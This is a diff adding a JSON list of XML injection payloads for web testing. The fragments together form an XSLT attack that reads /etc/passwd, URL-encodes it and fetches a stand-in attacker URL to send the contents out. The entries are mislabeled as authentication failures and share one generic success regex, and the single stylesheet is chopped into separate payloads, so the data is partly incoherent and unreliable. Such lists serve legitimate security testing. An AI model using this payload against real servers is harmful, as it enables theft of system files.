@@ -1,0 +1,101 @@
+[
+  {
+    "payload_id": "OWP-242651",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242693",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE Response [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242711",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242712",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:template match=\"doc\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242713",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242714",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242715",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"attackerUrl\" select=\"'http://[ATTACKER.DOMAIN.TLD]/'\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242716",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:variable name=\"exploitUrl\"select=\"concat($attackerUrl,$escaped)\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-242717",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:value-of select=\"unparsed-text($exploitUrl)\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  }
+]
